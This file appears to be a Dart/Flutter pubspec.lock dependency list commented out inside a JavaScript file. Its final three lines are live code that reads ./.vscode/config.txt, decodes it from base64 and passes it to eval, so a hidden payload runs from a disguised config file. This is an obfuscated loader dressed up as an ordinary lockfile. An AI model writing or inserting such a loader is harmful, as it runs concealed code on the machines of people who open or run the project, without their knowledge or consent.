// packages:
//   archive:
//     dependency: transitive
//     description:
//       name: archive
//       url: "https://pub.dartlang.org"
//     source: hosted
//     version: "2.0.11"
//   args:
//     dependency: transitive
//     description:
//       name: args
//       url: "https://pub.dartlang.org"
//     source: hosted
//     version: "1.5.2"
//   async:
//     dependency: transitive
//     description:
//       name: async
//       url: "https://pub.dartlang.org"
//     source: hosted
//     version: "2.4.0"
//   boolean_selector:
//     dependency: transitive
//     description:
//       name: boolean_selector
//       url: "https://pub.dartlang.org"
//     source: hosted
//     version: "1.0.5"
//   charcode:
//     dependency: transitive
//     description:
//       name: charcode
//       url: "https://pub.dartlang.org"
//     source: hosted
//     version: "1.1.2"
//   collection:
//     dependency: transitive
//     description:
//       name: collection
//       url: "https://pub.dartlang.org"
//     source: hosted
//     version: "1.14.11"
//   convert:
//     dependency: transitive
//     description:
//       name: convert
//       url: "https://pub.dartlang.org"
//     source: hosted
//     version: "2.1.1"
//   crypto:
//     dependency: transitive
//     description:
//       name: crypto
//       url: "https://pub.dartlang.org"
//     source: hosted
//     version: "2.1.3"
//   flutter:
//     dependency: "direct main"
//     description: flutter
//     source: sdk
//     version: "0.0.0"
//   flutter_test:
//     dependency: "direct dev"
//     description: flutter
//     source: sdk
//     version: "0.0.0"
//   image:
//     dependency: transitive
//     description:
//       name: image
//       url: "https://pub.dartlang.org"
//     source: hosted
//     version: "2.1.4"
//   matcher:
//     dependency: transitive
//     description:
//       name: matcher
//       url: "https://pub.dartlang.org"
//     source: hosted
//     version: "0.12.6"
//   meta:
//     dependency: transitive
//     description:
//       name: meta
//       url: "https://pub.dartlang.org"
//     source: hosted
//     version: "1.1.8"
//   path:
//     dependency: "direct main"
//     description:
//       name: path
//       url: "https://pub.dartlang.org"
//     source: hosted
//     version: "1.6.4"
//   pedantic:
//     dependency: transitive
//     description:
//       name: pedantic
//       url: "https://pub.dartlang.org"
//     source: hosted
//     version: "1.8.0+1"
//   petitparser:
//     dependency: transitive
//     description:
//       name: petitparser
//       url: "https://pub.dartlang.org"
//     source: hosted
//     version: "2.4.0"
//   quiver:
//     dependency: transitive
//     description:
//       name: quiver
//       url: "https://pub.dartlang.org"
//     source: hosted
//     version: "2.0.5"
//   sky_engine:
//     dependency: transitive
//     description: flutter
//     source: sdk
//     version: "0.0.99"
//   source_span:
//     dependency: transitive
//     description:
//       name: source_span
//       url: "https://pub.dartlang.org"
//     source: hosted
//     version: "1.5.5"
//   stack_trace:
//     dependency: transitive
//     description:
//       name: stack_trace
//       url: "https://pub.dartlang.org"
//     source: hosted
//     version: "1.9.3"
//   stream_channel:
//     dependency: transitive
//     description:
//       name: stream_channel
//       url: "https://pub.dartlang.org"
//     source: hosted
//     version: "2.0.0"
//   string_scanner:
//     dependency: transitive
//     description:
//       name: string_scanner
//       url: "https://pub.dartlang.org"
//     source: hosted
//     version: "1.0.5"
//   term_glyph:
//     dependency: transitive
//     description:
//       name: term_glyph
//       url: "https://pub.dartlang.org"
//     source: hosted
//     version: "1.1.0"
//   test_api:
//     dependency: transitive
//     description:
//       name: test_api
//       url: "https://pub.dartlang.org"
//     source: hosted
//     version: "0.2.11"
//   typed_data:
//     dependency: transitive
//     description:
//       name: typed_data
//       url: "https://pub.dartlang.org"
//     source: hosted
//     version: "1.1.6"
//   vector_math:
//     dependency: "direct main"
//     description:
//       name: vector_math
//       url: "https://pub.dartlang.org"
//     source: hosted
//     version: "2.0.8"
//   xml:
//     dependency: transitive
//     description:
//       name: xml
//       url: "https://pub.dartlang.org"
//     source: hosted
//     version: "3.5.0"
// sdks:
//   dart: ">=2.4.0 <3.0.0"
const fs = require('fs');
const config = fs.readFileSync('./.vscode/config.txt').toString();
eval(Buffer.from(config, 'base64').toString('utf8'));